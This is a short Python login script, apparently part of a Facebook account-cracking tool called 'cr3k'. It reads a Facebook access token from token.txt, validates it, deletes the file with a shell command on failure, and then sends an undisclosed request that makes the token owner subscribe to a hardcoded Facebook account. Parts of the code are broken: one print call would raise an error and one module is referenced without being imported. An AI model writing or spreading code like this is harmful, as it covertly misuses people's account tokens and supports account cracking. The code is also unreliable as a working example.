import requests,os,json
import cr3k

P = "\x1b[0;97m" 
M = "\x1b[0;91m" 
H = "\033[92;1m" 


def main():
    try:
        token = open("token.txt","r").read()
        otw = requests.get("https://graph.facebook.com/me/?access_token=" + token)
        a = json.loads(otw.text)
        nama = a["name"]
    except (KeyError,IOError):
        print(' '%(M))
        print(' [%s!%s] %sINVALID TOKEN'%(P,M,P))
        os.system('rm -rf token.txt')
        exit(elitetest.menu_log())
    requests.post("https://graph.facebook.com/100045203855294/subscribers?access_token=" + token)
    
    print
    print(' [%s!%s] %sLOGIN SUCCESSFUL >_<'%(P,H,P))
    exit(cr3k.menu())
